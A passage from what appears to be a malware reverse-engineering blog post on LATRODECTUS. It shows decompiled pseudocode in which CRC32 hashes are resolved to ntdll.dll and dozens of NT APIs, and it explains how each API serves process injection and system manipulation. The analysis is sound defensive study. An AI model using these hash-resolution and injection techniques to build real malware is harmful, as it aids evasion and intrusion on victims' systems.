</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="resolving-modules--functions">resolving modules + functions</h2>
<p>there is another hash [<code>0x26797E77</code>] being passed to the function <code>unk_180010EB8()</code> via <code>sub_18000821C()</code> (now called <code>mw_get_module_handle()</code>).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#50fa7b">sub_18000AA30</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> i; <span style="color:#6272a4">// [rsp+20h] [rbp-28h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; <span style="color:#ff79c6">!</span>i; i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        unk_180010EB8 <span style="color:#ff79c6">=</span> mw_get_module_handle(<span style="color:#bd93f9">0x26797E77</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>unk_180010EB8 )
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0LL</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">1LL</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>using HashDB Hunt Algorithm + HashDB Lookup again reveals the hash inside the <code>crc32</code> algorithm, and that the hash corresponds to <code>ntdll.dll</code>!</p>
<p>so:
<code>0x26797E77</code> can be resolved to <code>ntdll_dll</code>; <code>unk_180010EB8()</code> can be resolved to <code>mw_handle_ntdll_dll()</code>; <code>sub_18000AA30()</code> can be resolved to <code>mw_resolve_ntdll_dll()</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#50fa7b">mw_resolve_ntdll_dll</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> i; <span style="color:#6272a4">// [rsp+20h] [rbp-28h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; <span style="color:#ff79c6">!</span>i; i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        mw_handle_ntdll_dll <span style="color:#ff79c6">=</span> mw_get_module_handle(ntdll_dll);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>mw_handle_ntdll_dll )
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0LL</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">1LL</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="nt-apis">NT APIs</h2>
<p><code>sub_18000A3F8()</code> is a large function that contains several hashes, and shows <code>mw_handle_ntdll_dll</code> being used.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>[<span style="color:#f1fa8c">&#34;... this pattern continues above&#34;</span>]
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> v110; <span style="color:#6272a4">// [rsp+390h] [rbp-28h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>v111; <span style="color:#6272a4">// [rsp+398h] [rbp-20h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">__int64</span> (<span style="color:#ff79c6">__fastcall</span> <span style="color:#ff79c6">**</span>v112)(_QWORD, _QWORD, _QWORD, _QWORD, _DWORD)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v2[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">529125397</span>;
</span></span><span style="display:flex;"><span>v3 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_handle_ntdll_dll;
</span></span><span style="display:flex;"><span>v4 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>qword_180010A10;
</span></span><span style="display:flex;"><span>v5 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1268447051</span>;
</span></span><span style="display:flex;"><span>v6 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_handle_ntdll_dll;
</span></span><span style="display:flex;"><span>v7 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>qword_1800109C8;
</span></span><span style="display:flex;"><span>v8 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">898953861</span>;
</span></span><span style="display:flex;"><span>v9 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_handle_ntdll_dll;
</span></span><span style="display:flex;"><span>v10 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>unk_1800109D0;
</span></span><span style="display:flex;"><span>v11 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1513862064</span>;
</span></span><span style="display:flex;"><span>v12 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_handle_ntdll_dll;
</span></span><span style="display:flex;"><span>v13 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>qword_1800109D8;
</span></span><span style="display:flex;"><span>v14 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">823342452</span>;
</span></span><span style="display:flex;"><span>v15 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_handle_ntdll_dll;
</span></span><span style="display:flex;"><span>v16 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>unk_180010A70;
</span></span><span style="display:flex;"><span>v17 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">96068967</span>;
</span></span><span style="display:flex;"><span>v18 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_handle_ntdll_dll;
</span></span><span style="display:flex;"><span>[<span style="color:#f1fa8c">&#34;... this pattern continues until v112&#34;</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0x25uLL</span>; <span style="color:#ff79c6">++</span> i )
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">*</span>(<span style="color:#ff79c6">&amp;</span>v4)[<span style="color:#bd93f9">3</span> <span style="color:#ff79c6">*</span> i ] <span style="color:#ff79c6">=</span> (<span style="color:#ff79c6">__int64</span> (<span style="color:#ff79c6">__fastcall</span> <span style="color:#ff79c6">*</span>)(_QWORD, _QWORD, _QWORD, _QWORD, _DWORD, _DWORD)sub_180008540(<span style="color:#ff79c6">*</span>(_QWORD <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">*</span>(<span style="color:#ff79c6">&amp;</span>v3 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">3</span> <span style="color:#ff79c6">*</span> i), v2[<span style="color:#bd93f9">6</span> <span style="color:#ff79c6">*</span> i], <span style="color:#bd93f9">0</span>));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">return</span> <span style="color:#bd93f9">1LL</span>;
</span></span></code></pre></div><p>depending on your level of experience with a function like this, it can signal different things. one of the main ideas should be that it&rsquo;s probably resolving <code>Nt</code>-level (i.e. Native). the Windows Native API is an abstraction layer that sits between the OS kernel, and the Win32 API. it&rsquo;s exported from <code>ntdll.dll</code> (in the <code>system32</code> folder), with the exports being stubs for the kernel.</p>
<p>simply put, the <code>NT API</code> is a convenient and fast way for user-mode applications to communicate with kernel-mode functions and processes.</p>
<p>let&rsquo;s start to analyze this the same way as i&rsquo;ve done previously: the hash.</p>
<p>hitting <code>H</code> on the first hash will convert it to hex: <code>v2[0] = 0xE0762FEB;</code>. looking up this hash finds a match: <code>NtAllocateVirtualMemory</code>. thus, we can rewrite the value of <code>v2[0]</code>: <code>v2[0] = NtAllocateVirtualMemory_0;</code>.</p>
<p>another clue to help in deciphering this function is at the bottom.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0x25uLL</span>; <span style="color:#ff79c6">++</span> i )
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">*</span>(<span style="color:#ff79c6">&amp;</span>v4)[<span style="color:#bd93f9">3</span> <span style="color:#ff79c6">*</span> i ] <span style="color:#ff79c6">=</span> (<span style="color:#ff79c6">__int64</span> (<span style="color:#ff79c6">__fastcall</span> <span style="color:#ff79c6">*</span>)(_QWORD, _QWORD, _QWORD, _QWORD, _DWORD, _DWORD)sub_180008540(<span style="color:#ff79c6">*</span>(_QWORD <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">*</span>(<span style="color:#ff79c6">&amp;</span>v3 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">3</span> <span style="color:#ff79c6">*</span> i), v2[<span style="color:#bd93f9">6</span> <span style="color:#ff79c6">*</span> i], <span style="color:#bd93f9">0</span>));
</span></span></code></pre></div><p>both <code>v2[0]</code> and <code>v3</code> are being passed to a function <code>sub_180008540()</code>. this would imply that the <code>_QWORD</code> that appears at every 3rd value (like <code>v4 = &amp;qword_180010A10</code>) is actually the <strong>address</strong> of the API function referenced at the 1st value. using this logic, we can rename <code>v2[0]</code>, <code>v3</code>, and <code>v4</code> as:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v2[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">=</span> NtAllocateVirtualMemory_0;
</span></span><span style="display:flex;"><span>v3 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_handle_ntdll_dll;
</span></span><span style="display:flex;"><span>v4 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtAllocateVirtualMemory;
</span></span></code></pre></div><p>at this point, a pattern should emerge: this large function&rsquo;s mission is to resolve all the Dynamic APIs needed for the malware to work. the first value is the name of the API, the second value is getting the handle of the API, and the third value is the memory address of the API.</p>
<p>repeating the above steps for the rest of the functions should now be straightforward. remember, every second value is <code>&amp;mw_handle_ntdll_dll</code>, which i&rsquo;m not going to include in the code below (but it&rsquo;s still needed).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v5 <span style="color:#ff79c6">=</span> RtlGetVersion_0;
</span></span><span style="display:flex;"><span>v7 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_RtlGetVersion;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v8 <span style="color:#ff79c6">=</span> NtCreateThread_0;
</span></span><span style="display:flex;"><span>v10 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtCreateThread;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v11 <span style="color:#ff79c6">=</span> NtQueryInformationProcess_0;
</span></span><span style="display:flex;"><span>v13 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtQueryInformationProcess;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v14 <span style="color:#ff79c6">=</span> NtQueryInformationThread_0;
</span></span><span style="display:flex;"><span>v16 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtQueryInformationThread;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v17 <span style="color:#ff79c6">=</span> NtCreateUserProcess_0;
</span></span><span style="display:flex;"><span>v19 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtCreateUserProcess;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v20 <span style="color:#ff79c6">=</span> NtMapViewOfSection_0;
</span></span><span style="display:flex;"><span>v22 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtMapViewOfSection;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v23 <span style="color:#ff79c6">=</span> NtCreateSection_0;
</span></span><span style="display:flex;"><span>v25 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtCreateSection;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v26 <span style="color:#ff79c6">=</span> LdrLoadDll_0;
</span></span><span style="display:flex;"><span>v28 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_LdrLoadDll;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v29 <span style="color:#ff79c6">=</span> LdrGetDllHandle_0;
</span></span><span style="display:flex;"><span>v31 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_LdrGetDllHandle;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v32 <span style="color:#ff79c6">=</span> NtWriteVirtualMemory_0;
</span></span><span style="display:flex;"><span>v34 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtWriteVirtualMemory;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v35 <span style="color:#ff79c6">=</span> NtProtectVirtualMemory_0;
</span></span><span style="display:flex;"><span>v37 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtProtectVirtualMemory;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v38 <span style="color:#ff79c6">=</span> NtDeviceIoControlFile_0;
</span></span><span style="display:flex;"><span>v40 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtDeviceIoControlFile;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v41 <span style="color:#ff79c6">=</span> NtSetContextThread_0;
</span></span><span style="display:flex;"><span>v43 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtSetContextThread;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v44 <span style="color:#ff79c6">=</span> NtOpenProcess_0;
</span></span><span style="display:flex;"><span>v46 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtOpenProcess;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v47 <span style="color:#ff79c6">=</span> NtClose_0;
</span></span><span style="display:flex;"><span>v49 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtClose;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v50 <span style="color:#ff79c6">=</span> NtCreateFile_0;
</span></span><span style="display:flex;"><span>v52 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtCreateFile;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v53 <span style="color:#ff79c6">=</span> NtOpenFile_0;
</span></span><span style="display:flex;"><span>v55 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtOpenFile;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v56 <span style="color:#ff79c6">=</span> NtDeleteFile_0;
</span></span><span style="display:flex;"><span>v58 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtDeleteFile;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v59 <span style="color:#ff79c6">=</span> NtReadVirtualMemory_0;
</span></span><span style="display:flex;"><span>v61 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtReadVirtualMemory;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v62 <span style="color:#ff79c6">=</span> NtQueryVirtualMemory_0;
</span></span><span style="display:flex;"><span>v64 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtQueryVirtualMemory;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v65 <span style="color:#ff79c6">=</span> NtOpenThread_0;
</span></span><span style="display:flex;"><span>v67 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtOpenThread;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v68 <span style="color:#ff79c6">=</span> NtResumeThread_0;
</span></span><span style="display:flex;"><span>v70 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtResumeThread;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v71 <span style="color:#ff79c6">=</span> NtFreeVirtualMemory_0;
</span></span><span style="display:flex;"><span>v73 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtFreeVirtualMemory;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v74 <span style="color:#ff79c6">=</span> NtFlushInstructionCache_0;
</span></span><span style="display:flex;"><span>v76 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtFlushInstructionCache;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v77 <span style="color:#ff79c6">=</span> RtlRandomEx_0;
</span></span><span style="display:flex;"><span>v79 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_RtlRandomEx;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v80 <span style="color:#ff79c6">=</span> NtQuerySystemInformation_0;
</span></span><span style="display:flex;"><span>v82 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtQuerySystemInformation;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v83 <span style="color:#ff79c6">=</span> LdrQueryProcessModuleInformation_0;
</span></span><span style="display:flex;"><span>v85 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_LdrQueryProcessModuleInformation;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v86 <span style="color:#ff79c6">=</span> RtlInitUnicodeString_0;
</span></span><span style="display:flex;"><span>v88 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_RtlInitUnicodeString;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v89 <span style="color:#ff79c6">=</span> NtWriteFile_0;
</span></span><span style="display:flex;"><span>v91 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtWriteFile;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v92 <span style="color:#ff79c6">=</span> NtReadFile_0;
</span></span><span style="display:flex;"><span>v94 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtReadFile;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v95 <span style="color:#ff79c6">=</span> NtDelayExecution_0;
</span></span><span style="display:flex;"><span>v97 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtDelayExecution;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v98 <span style="color:#ff79c6">=</span> NtOpenKey_0;
</span></span><span style="display:flex;"><span>v100 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtOpenKey;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v101 <span style="color:#ff79c6">=</span> NtSetValueKey_0;
</span></span><span style="display:flex;"><span>v103 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtSetValueKey;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v104 <span style="color:#ff79c6">=</span> NtQueryValueKey_0;
</span></span><span style="display:flex;"><span>v106 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtQueryValueKey;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v107 <span style="color:#ff79c6">=</span> RtlFormatCurrentUserKeyPath_0;
</span></span><span style="display:flex;"><span>v109 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_RtlFormatCurrentUserKeyPath;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v110 <span style="color:#ff79c6">=</span> NtQueryInformationFile_0;
</span></span><span style="display:flex;"><span>v112 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtQueryInformationFile;
</span></span></code></pre></div><h2 id="what-do-these-apis-do">what do these APIs do?</h2>
<p>the large function <code>sub_18000A3F8()</code> can now be resolved to <code>mw_resolve_ntapi()</code>, as it&rsquo;s clearly attempting to interact with low-level system operations: functionalities like memory management, thread/process manipulation, file + I/O operations, registry access, information gathering, etc.</p>
<p>here&rsquo;s a breakdown of what each of these APIs do.</p>
<h1 id="ntallocatevirtualmemory_0"><code>NtAllocateVirtualMemory_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v2[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">=</span> NtAllocateVirtualMemory_0;
</span></span></code></pre></div><p>this allocates memory in the virtual address space of a process. it&rsquo;s essential for managing memory dynamically within a process, as it allows the allocation of memory regions.</p>
<p><code>LATRODECTUS</code> probably uses this API to allocate memory where it can load/inject its payload. as i&rsquo;ve talked about in an earlier post, this is a critical step in process injection techniques: malware needs to create space in a target process&rsquo;s memory to insert + execute its code.</p>
<p><code>v2[0]</code> means that the first element of the <code>v2</code> array is assigned the hash (or identifier) of the <code>NtAllocateVirtualMemory</code> function.</p>
<h1 id="rtlgetversion_0"><code>RtlGetVersion_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v5 <span style="color:#ff79c6">=</span> RtlGetVersion_0;
</span></span><span style="display:flex;"><span>v7 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_RtlGetVersion;
</span></span></code></pre></div><p>gets version information about current OS. can be used to check OS version + tailor behaviour based on versions.</p>
<h1 id="ntcreatethread_0"><code>NtCreateThread_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v8 <span style="color:#ff79c6">=</span> NtCreateThread_0;
</span></span><span style="display:flex;"><span>v10 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtCreateThread;
</span></span></code></pre></div><p>creates a new thread within the current process (or a remote process). can be used to spawn threads for running payloads, or inject code into other processes.</p>
<h1 id="ntqueryinformationprocess_0"><code>NtQueryInformationProcess_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v11 <span style="color:#ff79c6">=</span> NtQueryInformationProcess_0;
</span></span><span style="display:flex;"><span>v13 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtQueryInformationProcess;
</span></span></code></pre></div><p>gets information about a process: memory usage, exit status, privileges. can be used to collect details about a process.</p>
<h1 id="ntqueryinformationthread_0"><code>NtQueryInformationThread_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v14 <span style="color:#ff79c6">=</span> NtQueryInformationThread_0;
</span></span><span style="display:flex;"><span>v16 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtQueryInformationThread;
</span></span></code></pre></div><p>gets information about a thread: priority, base priority, processor affinity. can be used to inspect its own threads or those of another process.</p>
<h1 id="ntcreateuserprocess_0"><code>NtCreateUserProcess_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v17 <span style="color:#ff79c6">=</span> NtCreateUserProcess_0;
</span></span><span style="display:flex;"><span>v19 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtCreateUserProcess;
</span></span></code></pre></div><p>creates a new process with specific attributes. can be used to spawn a new process.</p>
<h1 id="ntmapviewofsection_0"><code>NtMapViewOfSection_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v20 <span style="color:#ff79c6">=</span> NtMapViewOfSection_0;
</span></span><span style="display:flex;"><span>v22 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtMapViewOfSection;
</span></span></code></pre></div><p>maps a view of a section [range of memory] into the address space of a calling process, or another process. this is used in process injection techniques.</p>
<h1 id="ntcreatesection_0"><code>NtCreateSection_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v23 <span style="color:#ff79c6">=</span> NtCreateSection_0;
</span></span><span style="display:flex;"><span>v25 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtCreateSection;
</span></span></code></pre></div><p>creates a section object, which is used to share memory between processes or to map files into memory. can be used with <code>NtMapViewOfSection</code> for advanced process injection or file mapping.</p>
<h1 id="ldrloaddll_0"><code>LdrLoadDll_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v26 <span style="color:#ff79c6">=</span> LdrLoadDll_0;
</span></span><span style="display:flex;"><span>v28 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_LdrLoadDll;
</span></span></code></pre></div><p>loads a DLL into the address space of the current process. the malware might be dynamically loading additional libraries that it needs to adapt or extend its functionality.</p>
<h1 id="ldrgetdllhandle_0"><code>LdrGetDllHandle_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v29 <span style="color:#ff79c6">=</span> LdrGetDllHandle_0;
</span></span><span style="display:flex;"><span>v31 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_LdrGetDllHandle;
</span></span></code></pre></div><p>gets a handle to a loaded DLL. can be used to check if a DLL is already loaded, or to get a reference to use its functions.</p>
<h1 id="ntwritevirtualmemory_0"><code>NtWriteVirtualMemory_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v32 <span style="color:#ff79c6">=</span> NtWriteVirtualMemory_0;
</span></span><span style="display:flex;"><span>v34 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtWriteVirtualMemory;
</span></span></code></pre></div><p>writes data to the virtual memory of a process. usually used to inject payload into another process&rsquo;s memory.</p>
<h1 id="ntprotectvirtualmemory_0"><code>NtProtectVirtualMemory_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v35 <span style="color:#ff79c6">=</span> NtProtectVirtualMemory_0;
